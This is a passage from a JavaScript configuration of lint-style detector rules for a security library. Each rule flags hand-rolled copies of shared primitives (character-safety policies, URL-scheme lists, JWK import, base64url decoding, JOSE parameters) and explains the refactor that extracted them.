b.gateContract.severityDisposition.",
  },
  {
    id: "char-threats-reject-all-hand-rolled",
    primitive: "b.gateContract.CHAR_THREATS_REJECT_ALL (lib/gate-contract.js) — the frozen universal character-safety floor { bidiPolicy / controlPolicy / nullBytePolicy / zeroWidthPolicy: \"reject\" }, the four invisible-character threats every identifier/protocol guard refuses in every profile tier (and every content guard refuses in `strict`). Re-declaring the four `bidiPolicy: \"reject\", controlPolicy: \"reject\", nullBytePolicy: \"reject\", zeroWidthPolicy: \"reject\"` lines inside a profile tier re-spells it; spread the constant instead: `{ ...gateContract.CHAR_THREATS_REJECT_ALL, ... }` (override one class after the spread to relax it, e.g. `zeroWidthPolicy: \"strip\"`).",
    // Anchors on the four char-threat axes each set to "reject" IN ORDER within a
    // profile tier (the [^"]{0,120}? tempered gaps span whitespace + trailing
    // policy comments but cannot cross into another string value; they are ReDoS
    // backstops, not the precision mechanism). A tier that relaxes any one class
    // (html/svg strict zeroWidthPolicy:"strip"; every content balanced/permissive
    // tier strip/audit) breaks the final "reject" and does NOT match. The shared
    // literal lives once in gate-contract.js (the constant declaration), which is
    // the sole allowlist entry; routed guards carry only the spread token.
    regex: /bidiPolicy\s*:\s*"reject"\s*,[^"]{0,120}?controlPolicy\s*:\s*"reject"\s*,[^"]{0,120}?nullBytePolicy\s*:\s*"reject"\s*,[^"]{0,120}?zeroWidthPolicy\s*:\s*"reject"/,
    skipCommentLines: true,
    allowlist: ["lib/gate-contract.js"],
    reason: "The four-axis all-reject character-safety block { bidiPolicy / controlPolicy / nullBytePolicy / zeroWidthPolicy: \"reject\" } was re-declared ~47 times: every one of the 13 identifier/protocol guards (guard-auth / guard-cidr / guard-domain / guard-graphql / guard-jsonpath / guard-jwt / guard-mime / guard-oauth / guard-regex / guard-shell / guard-template / guard-time / guard-uuid) repeated it in ALL THREE profile tiers, and the 8 content guards whose `strict` tier rejects all four (guard-xml / guard-markdown / guard-yaml / guard-json / guard-text / guard-email / guard-archive / guard-filename) repeated it once. It is a security invariant, not per-guard config — a future tier that silently set one class to \"audit\" would be an undetectable downgrade. Extracted the frozen b.gateContract.CHAR_THREATS_REJECT_ALL; each all-four-reject tier became `{ ...gateContract.CHAR_THREATS_REJECT_ALL, ... }` (value-parity proven via buildProfile per tier). Genuinely divergent tiers keep their own literals and do NOT match: html/svg `strict` strip zero-width; every content `balanced`/`permissive` strips or audits; guard-csv uses a different opt vocabulary (bidiCharPolicy / controlCharPolicy / nullByteHandling). Allowlist names lib/gate-contract.js ONLY — the constant's single home. A re-introduced inlined all-four-reject block trips this — spread b.gateContract.CHAR_THREATS_REJECT_ALL.",
  },
  {
    id: "identifier-fixtures-hand-rolled",
    primitive: "b.gateContract.identifierFixtures(benign, hostile, encoding?) (lib/gate-contract.js) — builds an identifier guard's frozen INTEGRATION_FIXTURES { kind: \"identifier\", benignBytes, hostileBytes, benignIdentifier, hostileIdentifier } from one benign + one hostile sample string, deriving each byte form as Buffer.from(sample, encoding) (encoding default \"utf8\", \"ascii\" for line-protocol command samples). Hand-writing the literal repeats every sample twice (`benignBytes: Buffer.from(\"x\"), benignIdentifier: \"x\"`); call `gateContract.identifierFixtures(\"x\", \"y\")` instead.",
    // Anchors on the derivable-fixture pairing: a `benignBytes: Buffer.from(`
    // byte form followed by a `benignIdentifier:` string form — the two
    // representations of the same sample that the helper derives from one
    // argument. Content/entries/filename guards carry no `benignIdentifier:`
    // field (they use benignGraphqlRequest / benignEntries / benignFilename),
    // so they never match. The {0,400} is a ReDoS backstop spanning the
    // inter-field hostileBytes line (and a multi-line JWT/command byte
    // literal), not the precision mechanism. The helper's own return lives in
    // lib/gate-contract.js — its sole allowlist entry.
    regex: /benignBytes\s*:\s*Buffer\.from\([\s\S]{0,400}?benignIdentifier\s*:/,
    skipCommentLines: true,
    allowlist: ["lib/gate-contract.js"],
    reason: "11 identifier guards (guard-cidr / guard-domain / guard-jsonpath / guard-jwt / guard-mime / guard-regex / guard-shell / guard-smtp-command / guard-template / guard-time / guard-uuid) each hand-wrote their INTEGRATION_FIXTURES as a frozen literal that declared every benign/hostile sample TWICE — once as `benignBytes: Buffer.from(sample)` and once as `benignIdentifier: sample` — plus a `kind: \"identifier\"` field the layer-5 host harness never reads (it dispatches on the guard's KIND export). The byte form is just Buffer.from(the string), so the pair is a derivable duplication. Extracted b.gateContract.identifierFixtures(benign, hostile, encoding?) which derives the buffers from the two strings (deep-equal parity proven across all 11, incl. guard-smtp-command's \"ascii\" encoding and guard-jwt's multi-segment token). Allowlist names lib/gate-contract.js ONLY — the helper's single home (its return carries both `benignBytes: Buffer.from` and `benignIdentifier:`). Content/entries/filename guards have no benignIdentifier field and never match. A re-introduced hand-rolled identifier fixture trips this — use b.gateContract.identifierFixtures.",
  },
  {
    id: "dangerous-url-schemes-hand-rolled",
    primitive: "b.gateContract.DANGEROUS_URL_SCHEMES (lib/gate-contract.js) — the frozen markup-attribute scheme denylist [ \"javascript\", \"vbscript\", \"livescript\", \"mocha\", \"ecmascript\", \"file\", \"mhtml\", \"jar\", \"intent\", \"view-source\", \"feed\", \"data\" ], the XSS / dangerous-resource scheme set a markup sanitizer refuses in href/src/xlink:href. Re-declaring the literal array re-spells it; reference gateContract.DANGEROUS_URL_SCHEMES instead.",
    // Anchors on the canonical scheme ORDER — `livescript, mocha, ecmascript`
    // then `mhtml` — unique to the markup denylist. guard-markdown's separate,
    // intentionally-different policy list (mocha → view-source, no ecmascript;
    // policy-gates file: via its own filePolicy) does NOT match. The shared
    // constant's single home is lib/gate-contract.js — its sole allowlist entry.
    // The {0,80} is a ReDoS backstop over the two-line literal.
    regex: /"livescript"\s*,\s*"mocha"\s*,\s*"ecmascript"[\s\S]{0,80}?"mhtml"/,
    skipCommentLines: true,
    allowlist: ["lib/gate-contract.js"],
    reason: "guard-html and guard-svg each declared a BYTE-IDENTICAL DANGEROUS_SCHEMES array — the same 12 XSS / dangerous-resource URL schemes (javascript / vbscript / livescript / mocha / ecmascript / file / mhtml / jar / intent / view-source / feed / data) a markup sanitizer refuses in an attribute value. It is a security denylist, not per-guard config — a divergence between two markup sanitizers' dangerous-scheme sets would be an undetectable XSS gap. Extracted the frozen b.gateContract.DANGEROUS_URL_SCHEMES; html and svg now reference it (byte-parity proven, pure refactor). guard-markdown is NOT a member — it keeps its own intentionally-different curated list (it adds action schemes tel / facetime / blob and policy-gates file: through a separate filePolicy check), so it carries a different scheme order and this detector does not fire on it. Allowlist names lib/gate-contract.js ONLY — the constant's single home. A re-introduced inlined markup-scheme denylist trips this — reference b.gateContract.DANGEROUS_URL_SCHEMES.",
  },
  {
    id: "safe-url-schemes-hand-rolled",
    primitive: "b.gateContract.SAFE_URL_SCHEMES (lib/gate-contract.js) — the frozen markup-attribute safe-scheme allowlist base [ \"http\", \"https\", \"mailto\", \"tel\" ] a sanitizer accepts at the strict tier (extend with .concat for looser tiers). Re-declaring the literal re-spells it; reference gateContract.SAFE_URL_SCHEMES.",
    // Anchors on the exact 4-scheme strict allowlist order. The shared constant's
    // single home is lib/gate-contract.js — its sole allowlist entry.
    regex: /"http"\s*,\s*"https"\s*,\s*"mailto"\s*,\s*"tel"/,
    skipCommentLines: true,
    allowlist: ["lib/gate-contract.js"],
    reason: "guard-html and guard-svg each declared the byte-identical strict-tier safe-scheme allowlist base SAFE_SCHEMES = [\"http\", \"https\", \"mailto\", \"tel\"] (then .concat(ftp / sftp / ws / wss) for looser tiers). It is a security allowlist shared by the two markup sanitizers; extracted the frozen b.gateContract.SAFE_URL_SCHEMES (byte-parity proven, pure refactor) — html and svg now reference it and keep their own per-tier .concat extensions. Allowlist names lib/gate-contract.js ONLY — the constant's single home. A re-introduced inlined safe-scheme base trips this — reference b.gateContract.SAFE_URL_SCHEMES.",
  },
  {
    id: "mail-domain-hardened-validate-hand-rolled",
    primitive: "mailServerNet.validateDomainHardened(d, label, { guardDomainProfile, guardDomain, emit, refusedEvent }) (lib/mail-server-net.js) — the MX / Submission transfer servers' hardened-domain check: validate d against the guardDomain profile (pass-through when no profile) and emit a \"<refusedEvent>.domain_refused\" audit on refusal. Hand-rolling `guardDomain.validate(d, profile); if (!verdict.ok) emit(<evt>, { reason: verdict.issues && verdict.issues[0] && verdict.issues[0].kind, domain, label }, \"denied\")` re-spells it; call mailServerNet.validateDomainHardened with the server's refusedEvent.",
    // Anchors on the verdict-refusal audit shape (issues[0].kind + domain + label
    // + "denied") unique to this check. The shared impl lives once in
    // lib/mail-server-net.js — its sole allowlist entry. {0,60}/{0,40} are ReDoS
    // backstops over the audit-payload literal.
    regex: /verdict\.issues\s*&&\s*verdict\.issues\[0\]\s*&&\s*verdict\.issues\[0\]\.kind[\s\S]{0,60}?domain:[\s\S]{0,40}?label:[\s\S]{0,40}?"denied"/,
    skipCommentLines: true,
    allowlist: ["lib/mail-server-net.js"],
    reason: "mail-server-mx and mail-server-submission each hand-rolled a BYTE-IDENTICAL _validateDomainHardened (validate the HELO / MAIL FROM / RCPT TO domain against the guardDomain profile, emit a domain_refused audit on refusal) differing ONLY in the audit event prefix (mail.server.mx vs mail.server.submission). A 2-file same-fn-same-domain pair below the STRONG-DUP threshold, hidden inside the mail-server scaffolding cluster — and a security-relevant one (a divergence between the two transfer servers' domain validation would be a silent spoofing / IDN-homograph gap on one of them). Extracted mailServerNet.validateDomainHardened(d, label, cfg) (the refusedEvent is the only per-server datum); each server keeps a thin wrapper binding its closure vars + event. Allowlist names lib/mail-server-net.js ONLY — the single home. A re-introduced inline hardened-domain validate trips this — use mailServerNet.validateDomainHardened.",
  },
  {
    id: "obs-instance-fallback-emit-hand-rolled",
    primitive: "b.observability.safeEmit(sink, name, value, labels) (lib/observability.js) — emit a metric event to a configured observability `sink` instance when present, else the global registry, each path try/catch drop-silent. Hand-rolling `var sink = obsInst || _safeGlobalObs(); if (!sink) return; try { sink.event(name, 1, labels); } catch (_e) {}` (plus a `_safeGlobalObs` lazy-require wrapper) re-spells it; call observability().safeEmit(obsInst, name, value, labels).",
    // Anchors on the configured-instance fallback + safe event emit:
    // `obsInst || …` then `.event(name, 1, …)`. The routed callers use
    // observability().safeEmit (no `obsInst ||` chain), and safeEmit's own
    // body has no `obsInst` token, so the allowlist is EMPTY. {0,80} is a
    // ReDoS backstop.
    regex: /\bobsInst\b\s*\|\|[\s\S]{0,80}?\.event\(\s*\w+\s*,\s*1\s*,/,
    skipCommentLines: true,
    allowlist: [],
    reason: "auth-bot-challenge, auth/lockout and session-device-binding each hand-rolled a BYTE-IDENTICAL _emitObs + _safeGlobalObs pair: `var sink = obsInst || _safeGlobalObs(); if (!sink) return; try { sink.event(name, 1, labels); } catch {}` over `_safeGlobalObs = try { return observability(); } catch { return null; }`. observability.safeEvent already deduped the GLOBAL-only emit (`_emitEvent`); this is the sink-aware variant (a per-create() observability instance with a global fallback). Extracted b.observability.safeEmit(sink, name, value, labels) (sink path or safeEvent fallback, each drop-silent); each module keeps a thin _emitObs wrapper that lazy-requires observability and calls safeEmit, and _safeGlobalObs is deleted. Allowlist is EMPTY: the routed callers carry `observability().safeEmit(obsInst, …)` (no `obsInst ||` chain) and safeEmit itself takes a bare `sink` (no obsInst token). A re-introduced obsInst-fallback emit trips this — use b.observability.safeEmit.",
  },
  {
    id: "txt-record-reshape-hand-rolled",
    primitive: "networkDnsResolver.resolveTxt(qname, dnsLookup?, resolver?) (lib/network-dns-resolver.js) — resolve TXT records (honouring an operator dnsLookup override, else a validating resolver) reshaped to the legacy string[][] form, throwing ENODATA when none exist. Hand-rolling `var r = await resolver.queryTxt(qname); for (…) if (rr.type === 16) out.push(Array.isArray(rr.decoded) ? rr.decoded : [String(rr.decoded)]); if (!out.length) throw ENODATA` re-spells it; call networkDnsResolver().resolveTxt(qname, dnsLookup, yourResolver).",
    // Anchors on the TXT-RR reshape: `rr.type === 16` then `Array.isArray(
    // rr.decoded) ? rr.decoded : [String(rr.decoded)]`. The shared impl lives
    // once in lib/network-dns-resolver.js (resolveTxt) — its sole allowlist
    // entry. {0,140} is a ReDoS backstop over the aligned-comment gap.
    regex: /rr\.type\s*===\s*16\)[\s\S]{0,140}?Array\.isArray\(rr\.decoded\)\s*\?\s*rr\.decoded\s*:\s*\[\s*String\(rr\.decoded\)/,
    skipCommentLines: true,
    allowlist: ["lib/network-dns-resolver.js"],
    reason: "mail-auth and mail-dkim each hand-rolled a BYTE-IDENTICAL _safeResolveTxt (queryTxt → reshape parsed RRs to the legacy string[][] form → throw ENODATA when none) that duplicated networkDnsResolver.resolveTxt — the same primitive the 8th extraction created and that mail-auth already used at other call sites (an inconsistency). resolveTxt gained an optional `resolver` param (the variation axis: the shared resolver vs the caller's own); mail-auth/mail-dkim now reshape off their own resolver via networkDnsResolver().resolveTxt(qname, lookup, _getDefaultResolver()), keeping the same resolver+cache they use for A/MX/PTR. Functional parity proven (reshape / dnsLookup-override / ENODATA). Allowlist names lib/network-dns-resolver.js ONLY — the reshape's single home. A re-introduced inline TXT-RR reshape trips this — use networkDnsResolver.resolveTxt.",
  },
  {
    id: "profile-name-resolution-hand-rolled",
    primitive: "b.gateContract.resolveProfileName(opts, postures, defaultProfile) (lib/gate-contract.js) — resolve a profile NAME with profile precedence (opts.profile, else opts.posture mapped through the compliance-posture table, else defaultProfile), WITHOUT throwing (the caller keeps its own typed bad-profile error). Hand-rolling `var profile = opts.profile || (opts.posture && COMPLIANCE_POSTURES[opts.posture]) || DEFAULT_PROFILE;` re-spells it; call gateContract.resolveProfileName(opts, COMPLIANCE_POSTURES, DEFAULT_PROFILE).",
    // Anchors on the resolution expression: `opts.profile || ( opts.posture &&
    // …[opts.posture] ) ||`. makeProfileResolver (posture-first, no inline
    // posture-in-the-profile-expression) does not match. The shared expression
    // lives once in lib/gate-contract.js (resolveProfileName), its sole allowlist
    // entry. {0,40} is a ReDoS backstop over the posture-table lookup.
    regex: /opts\.profile\s*\|\|\s*\(\s*opts\.posture\s*&&[\s\S]{0,40}?\[\s*opts\.posture\s*\]\s*\)\s*\|\|/,
    skipCommentLines: true,
    allowlist: ["lib/gate-contract.js"],
    reason: "6 create-time factories (guard-envelope / mail-greylist / mail-rbl / mail-scan / mail-helo / mail-spam-score) each hand-rolled the identical profile-NAME resolution `opts.profile || (opts.posture && COMPLIANCE_POSTURES[opts.posture]) || DEFAULT_PROFILE` followed by their OWN `if (!PROFILES[profile]) throw <typed, field-specific error>` and `var caps = PROFILES[profile]`. Only the resolution EXPRESSION is byte-identical; the throw message diverges per factory (mail.spamScore.create.profile / check / create / evaluate), so it stays per-caller (the requireNonEmptyString-class rule — do not normalize the domain message). Extracted the non-throwing b.gateContract.resolveProfileName (the resolution only, profile precedence); each caller keeps its bespoke bad-profile throw verbatim (proven: the original message is preserved). NOTE: this resolver gives PROFILE precedence whereas makeProfileResolver (24 callers) gives POSTURE precedence — the two coexist; centralizing the expression here makes a future precedence-unification a single edit. Allowlist names lib/gate-contract.js ONLY. A re-introduced inline profile||posture-table resolution trips this — use b.gateContract.resolveProfileName.",
  },
  {
    id: "jose-alg-params-hand-rolled",
    primitive: "jwtExternal.algParams(alg) (lib/auth/jwt-external.js) — the classical-JOSE alg → node:crypto sign/verify parameter table (RS/PS/ES per RFC 7518 §3, EdDSA per RFC 8037: hash + RSA PKCS1 padding / RSASSA-PSS saltLength / ECDSA dsaEncoding). Hand-rolling the `if (alg === \"RS256\") return { hash, padding: RSA_PKCS1_PADDING } … PS256 … RSA_PKCS1_PSS_PADDING …` if-chain / switch re-spells it; call jwtExternal.algParams(alg) (returns null for an unsupported alg) and throw your OWN typed error + apply your OWN supported-set restriction.",
    // Anchors on the table signature: RS256 → RSA_PKCS1_PADDING then PS256 →
    // RSA_PKCS1_PSS_PADDING within one function body (the {0,200}/{0,400}/{0,160}
    // are ReDoS backstops, not the precision mechanism). The shared table is the
    // canonical impl, so the allowlist names its single home (lib/auth/jwt-external.js).
    regex: /"RS256"[\s\S]{0,200}?RSA_PKCS1_PADDING[\s\S]{0,400}?"PS256"[\s\S]{0,160}?RSA_PKCS1_PSS_PADDING/,
    skipCommentLines: true,
    allowlist: ["lib/auth/jwt-external.js"],
    reason: "The JOSE alg→crypto-param table was TRIPLICATED with identical RS/PS/ES values across lib/auth/fido-mds3.js (_verifyParamsForAlg, MDS3 BLOB), lib/auth/oauth.js (_verifyParamsForAlg, ID-token verify) and lib/auth/jwt-external.js (_verifyParamsForAlg), plus a PQC-superset copy in lib/auth/dpop.js (_signParamsForAlg, +ML-DSA-87) — a drift hazard for a crypto table (a diverged saltLength/padding silently changes signature verification). Extracted jwtExternal.algParams(alg) (the classical-JOSE domain owner already hosts the shared _assertAlgKtyMatch) returning params or null; each caller's _verify/_signParamsForAlg became a thin wrapper that throws ITS OWN typed error and keeps ITS OWN supported set — oauth excludes EdDSA (`|| alg === \"EdDSA\"`), dpop layers ML-DSA-87 on top, fido/jwt-external take the classical set as-is (byte-parity proven across every alg). ONLY the verify-PARAM table is shared; the verify-ASSEMBLY (`if (params.padding !== undefined) verifyOpts.padding = …` + nodeCrypto.verify) stays per-caller because it diverges (PQC/EdDSA bare-key vs classical {key} object, sign vs verify, distinct error classes). Allowlist names lib/auth/jwt-external.js ONLY — the single home of the canonical table. A re-introduced hand-rolled JOSE alg-param table trips this — use jwtExternal.algParams.",
  },
  {
    id: "buffer-coercion-hand-rolled",
    primitive: "b.safeBuffer.toBuffer(data, { encoding?, errorFactory?, typeCode?, typeMessage? }) (lib/safe-buffer.js) — coerce a byte-shaped input (Buffer / Uint8Array / string) to a Buffer, throwing a typed error on any other type. Hand-rolling `if (Buffer.isBuffer(x)) return x; if (x instanceof Uint8Array) return Buffer.from(x); if (typeof x === \"string\") return Buffer.from(x, enc); throw new XError(...)` re-spells it; call safeBuffer.toBuffer(x, { encoding, errorFactory: (code, msg) => new XError(code, msg), typeCode, typeMessage }).",
    // Anchors on the hand-rolled RETURN-form coercion CORE: isBuffer)return →
    // instanceof Uint8Array) return Buffer.from. Deliberately does NOT require a
    // trailing `typeof "string") return Buffer.from` branch — the bytes-ONLY
    // variant (cose._coseKeyBytes / mdoc._bytes / network-dnssec._bytes, which
    // reject strings) shares this core, and requiring the string branch let them
    // slip past (the original miss). The primitive ASSIGNS (buf = data / buf =
    // Buffer.from(...)) rather than returning per-branch, so it never trips
    // lib/safe-buffer.js (empty allowlist). {0,90} is a ReDoS backstop.
    regex: /Buffer\.isBuffer\([^)]*\)\s*return[\s\S]{0,90}?instanceof Uint8Array\)\s*return Buffer\.from/,
    skipCommentLines: true,
    allowlist: [],
    reason: "8 modules hand-rolled the same Buffer-coercion helper in TWO variants. String-ACCEPTING (Buffer/Uint8Array/string→Buffer): content-digest._bodyBytes, cose._bstr, network-dane._bytes (hex), privacy-pass._bytes (base64), tsa._bytes. Bytes-ONLY (Buffer/Uint8Array, string THROWS): cose._coseKeyBytes (COSE_Key), mdoc._bytes (CBOR), network-dnssec._bytes — these reject a string by spec. safeBuffer.toBuffer already owned the coercion but hardcoded utf8 + threw via the (message, code) errorClass path; it gained `encoding`, an `errorFactory(code, message)` hook (caller classes are code-first defineClass), and `allowString` (false = byte-only, string throws), so all 8 route byte-identically (proven across Buffer / Uint8Array / valid+invalid strings / object / number / null). The detector anchors on the isBuffer-return + Uint8Array-return-Buffer.from CORE and deliberately does NOT require a string branch — requiring it is what let the 3 bytes-only members slip past the first pass (the documented miss). Allowlist is EMPTY: the primitive ASSIGNS into a local (buf = data / Buffer.from(...)) instead of the per-branch RETURN form, so lib/safe-buffer.js never trips. A re-introduced hand-rolled isBuffer/Uint8Array→Buffer coercion trips this — use b.safeBuffer.toBuffer.",
  },
  {
    // v0.15.13 — the binding sibling of buffer-coercion: each module wrapped
    // safeBuffer.toBuffer in a per-module `_bytes(value, what)` that binds the
    // module's error class + typeCode + a `prefix + what + suffix` message →
    // b.safeBuffer.makeByteCoercer.
    id: "byte-coercer-binding-hand-rolled",
    primitive: "b.safeBuffer.makeByteCoercer({ errorClass, typeCode, messagePrefix?, messageSuffix?, allowString?, encoding? }) (lib/safe-buffer.js) — bind toBuffer to one module's error contract, returning coerce(value, what) that interpolates `what` into a per-field message. Hand-rolling `function _bytes(x, what) { return safeBuffer.toBuffer(x, { errorFactory: function (code, msg) { return new XError(code, msg); }, typeCode: \"…\", typeMessage: \"<prefix>\" + what + \"<suffix>\" }); }` re-spells the binding; build `var _bytes = safeBuffer.makeByteCoercer({ errorClass: XError, typeCode: \"…\", messagePrefix: \"<prefix>\", messageSuffix: \"<suffix>\"[, allowString | encoding] })`.",
    // Anchors on `safeBuffer.toBuffer(` + an inline `errorFactory: function (…) {
    // return new <Class>` + a `typeMessage:` whose body INTERPOLATES a field var
    // (`… + what + …`). The interpolation excludes websocket's single inline
    // toBuffer (a STATIC typeMessage, no field var). The primitive calls bare
    // `toBuffer(` (no `safeBuffer.` prefix) and builds the message as `prefix +
    // (what == null ? "" : what) + suffix` (a paren, not `+ var +`) so it never
    // self-trips → ZERO allowlist.
    regex: /safeBuffer\.toBuffer\([\s\S]{0,80}?errorFactory:\s*function\s*\([^)]*\)\s*\{\s*return new\s+\w+[\s\S]{0,160}?typeMessage:[^,}]*\+\s*\w+\s*\+/,
    skipCommentLines: true,
    allowlist: [],
    reason: "7 modules each wrapped safeBuffer.toBuffer in a per-module `function _bytes(value, what) { return safeBuffer.toBuffer(value, { [allowString:false | encoding], errorFactory: function (code, msg) { return new XError(code, msg); }, typeCode, typeMessage: '<prefix>' + what + '<suffix>' }); }` binding — content-digest._bodyBytes / cose._coseKeyBytes / mdoc._bytes / network-dane._bytes / network-dnssec._bytes / privacy-pass._bytes / tsa._bytes. The toBuffer CALL is the primitive (correctly used); what duplicated was the binding wrapper — the `errorFactory: (c,m) => new XError(c,m)` boilerplate + typeCode + interpolated message. Extracted b.safeBuffer.makeByteCoercer(opts) (the byte-input sibling of audit/observability.namespaced): each module binds once with its error class + code + messagePrefix/Suffix + byte-mode (allowString:false for COSE/mdoc/DNSSEC wire bytes; encoding hex/base64 for dane/privacy-pass), and the factory injects `what` between prefix and suffix. websocket's one inline toBuffer (no `what`, a static typeMessage) is correctly NOT routed and NOT matched (no field interpolation). ZERO allowlist: the primitive calls bare toBuffer and builds the message with a paren-guarded `(what == null ? '' : what)`, never the `safeBuffer.toBuffer(` + `+ what +` shape. A re-introduced toBuffer-binding wrapper trips this — use b.safeBuffer.makeByteCoercer.",
  },
  {
    // v0.15.13 — every module that imports an UNTRUSTED JWK as a public key
    // hand-rolled `createPublicKey({ key: jwk, format: "jwk" })` + a per-module
    // typed-error catch → b.crypto.importPublicJwk. One hardening point for
    // untrusted-JWK import across DID / DNSSEC / COSE / OIDC / DPoP / DBSC.
    id: "create-public-jwk-hand-rolled",
    primitive: "b.crypto.importPublicJwk(jwk, opts?) (lib/crypto.js) — import a JWK as a public KeyObject via nodeCrypto.createPublicKey({ key, format: \"jwk\" }), translating the Node failure into a caller-supplied typed error (opts.errorClass / code / messagePrefix). Hand-rolling `try { return nodeCrypto.createPublicKey({ key: jwk, format: \"jwk\" }); } catch (e) { throw new XError(code, prefix + ((e && e.message) || e)); }` (or the assign `keyObj = createPublicKey(...)` variant) re-spells it; call crypto.importPublicJwk(jwk, { errorClass, code, messagePrefix }).",
    // Anchors on the bare `nodeCrypto.createPublicKey({ key: <var>, format:
    // \"jwk\" })` — the JWK-import call itself, regardless of return-vs-assign or
    // the catch shape — so the whole root is enforced, not one lexical form.
    // createPublicKey with format \"pem\" (mail-crypto-pgp) or createPublicKey(privKey)
    // (derive-from-private) and `.export({ format: \"jwk\" })` (web-push-vapid) are
    // DIFFERENT ops and don't match. Allowlist = crypto.js (the primitive's body
    // is the one legitimate site of this call).
    regex: /nodeCrypto\.createPublicKey\(\{\s*key:\s*[\w.]+,\s*format:\s*"jwk"\s*\}\)/,
    skipCommentLines: true,
    allowlist: ["lib/crypto.js"],
    reason: "12 sites across DID / DNSSEC / COSE / DPoP / external-JWT / OAuth / OID4VCI (×3) / OpenID-Federation / DBSC / SD-JWT-VC each hand-rolled the import of an untrusted JWK as a public key — `nodeCrypto.createPublicKey({ key: jwk, format: \"jwk\" })` — wrapped in a per-module typed-error catch (`throw new XError(code, '<prefix>' + ((e && e.message) || e))`), in both the `return` form (cose/did/dnssec/dpop/jwt-external/oauth) and the `keyObj = …` assign form (oid4vci/openid-federation/dbsc). Every one imports attacker-controlled key material (DID `publicKeyJwk`, DNSKEY, COSE_Key, DPoP/OAuth/OIDC proof JWKs), so the import deserves a single hardening point. Extracted b.crypto.importPublicJwk(jwk, { errorClass, code, messagePrefix }) — each caller keeps its own kty/crv pre-validation + its bespoke code + message (the dynamic `(kid=…)` prefixes compute at the call site and pass as messagePrefix; `String(e)` ≡ `e` under string concat so the message output is byte-identical). The no-catch SD-JWT-VC site routes with no opts (raw rethrow, unchanged). createPublicKey with format \"pem\" / from a private key / `.export({format:\"jwk\"})` are different ops and not matched. Allowlist = crypto.js (the primitive's home). A re-introduced hand-rolled JWK→public-key import trips this — use b.crypto.importPublicJwk.",
  },
  {
    // v0.15.13 — the four signature-verification modules hand-rolled the optional
    // `opts.at` verification-clock validation `if (!(opts.at instanceof Date) ||
    // !isFinite(opts.at.getTime())) throw new XError(...)` → validateOpts.optionalDate
    // (the optional* family already owns optionalBoolean/PositiveInt/Port/…).
    id: "optional-date-validate-hand-rolled",
    primitive: "b.validateOpts.optionalDate(value, label, errorClass, code) (lib/validate-opts.js) — the optional-Date member of the validateOpts.optional* family: returns the value when absent (undefined/null), throws `<label> must be a valid Date` via the caller's error class + code when present-but-invalid (not a Date, or an Invalid Date whose getTime() is NaN). Hand-rolling `if (X !== undefined && X !== null) { if (!(X instanceof Date) || !isFinite(X.getTime())) throw new XError(code, '<label> must be a valid Date'); }` re-spells it; call validateOpts.optionalDate(X, label, XError, code) then resolve the default.",
    // Anchors on `instanceof Date) || !isFinite(<expr>.getTime())` — the
    // Date-validity test. The primitive's own body is this exact check (allowlist
    // validate-opts.js). fido-mds3._ttlFromNextUpdate uses the SAME predicate but
    // RETURNS a default cache TTL (defensive-reader tier, §8) instead of throwing,
    // so it is a legitimately-different use, not an optionalDate caller — allowlisted.
    regex: /instanceof Date\)\s*\|\|\s*!\s*isFinite\(\s*\w+(?:\.\w+)*\.getTime\(\)\s*\)/,
    skipCommentLines: true,
    allowlist: ["lib/validate-opts.js", "lib/auth/fido-mds3.js"],
    reason: "4 signature-verification modules (mdoc.verifyIssuerSigned / tsa.verifyToken / vc.verify / network-dnssec.verifyRrset) each hand-rolled the SAME optional `opts.at` verification-clock validation — `if (opts.at !== undefined && opts.at !== null) { if (!(opts.at instanceof Date) || !isFinite(opts.at.getTime())) throw new XError('<x>/bad-at', '<X>.<verb>: opts.at must be a valid Date'); }` — differing only in error class + code + the label prefix; the default resolution differs per module (now / tst.genTime / Date.now()). The validateOpts.optional* family already owns this shape (optionalBoolean/optionalPositiveInt/optionalPort/…), so added optionalDate(value, label, errorClass, code) and routed all 4: byte-identical message (validateOpts builds `<label> + ' must be a valid Date'`, and passing label `'<X>.<verb>: opts.at' reproduces each verbatim), same error class + code; each caller keeps its own default after the validate call (a pure refactor). Allowlist: validate-opts.js (the primitive's body IS this predicate) + auth/fido-mds3.js (_ttlFromNextUpdate uses the same `instanceof Date || !isFinite(getTime())` predicate but RETURNS MIN_CACHE_TTL_MS — the §8 defensive-reader tier, not a config-time validator, so genuinely not an optionalDate caller). A re-introduced hand-rolled optional-Date throw trips this — use validateOpts.optionalDate.",
  },
  {
    // v0.15.13 — every base64url-carrying surface wrapped the strict
    // fromBase64Url decoder in the same `if (typeof s !== "string") throw;
    // try { return bCrypto.fromBase64Url(s); } catch { throw typed; }` shape to
    // translate its TypeError into a module error → b.crypto.makeBase64UrlDecoder.
    id: "base64url-decode-typed-error-hand-rolled",
    primitive: "b.crypto.makeBase64UrlDecoder({ errorClass, code, badMessage, typeMessage? }) (lib/crypto.js) — bind the strict fromBase64Url decoder to one module's error contract, returning decode(s) that translates the decoder's TypeError (bad type / non-canonical input) into the caller's typed error. Hand-rolling `function _b64urlDecode(s) { if (typeof s !== \"string\") throw new XError(code, typeMsg); try { return bCrypto.fromBase64Url(s); } catch (e) { throw new XError(code, badMsg); } }` re-spells it; build `var _b64urlDecode = bCrypto.makeBase64UrlDecoder({ errorClass, code, typeMessage, badMessage })` (omit typeMessage for the catch-everything variant).",
    // Anchors on `try { return bCrypto.fromBase64Url(<var>); } catch (...) { throw
    // new <Class>` — the decode-and-translate shape. The primitive calls bare
    // `fromBase64Url` (no `bCrypto.` prefix) so it never self-trips → ZERO allowlist.
    regex: /try\s*\{\s*return bCrypto\.fromBase64Url\([^)]*\);\s*\}\s*catch\s*\([^)]*\)\s*\{\s*throw new \w+/,
    skipCommentLines: true,
    allowlist: [],
    reason: "5 base64url-carrying surfaces (auth/jwt._b64urlDecode / auth/oauth._b64urlDecode / auth/dpop._b64urlDecode / auth/status-list._fromB64url / pagination._b64urlDecode) each wrapped the strict fromBase64Url decoder in `[if (typeof s !== 'string') throw new XError(code, typeMessage);] try { return bCrypto.fromBase64Url(s); } catch (e) { throw new XError(code, badMessage); }` to translate its TypeError (non-string OR the CWE-347 non-canonical-input rejection) into a module-specific error. Extracted b.crypto.makeBase64UrlDecoder({ errorClass, code, badMessage, typeMessage? }) — the JWT/DPoP/OAuth/pagination forms pass typeMessage (a non-string throws it directly), status-list omits it (a non-string falls into the catch-everything decode path, matching its original no-typeof shape). Each caller keeps its own error class + code + messages; pure refactor. ZERO allowlist: the primitive's body calls bare `fromBase64Url` (no `bCrypto.` prefix) so it never self-trips. A re-introduced hand-rolled fromBase64Url-with-typed-catch trips this — use b.crypto.makeBase64UrlDecoder.",
  },
  {
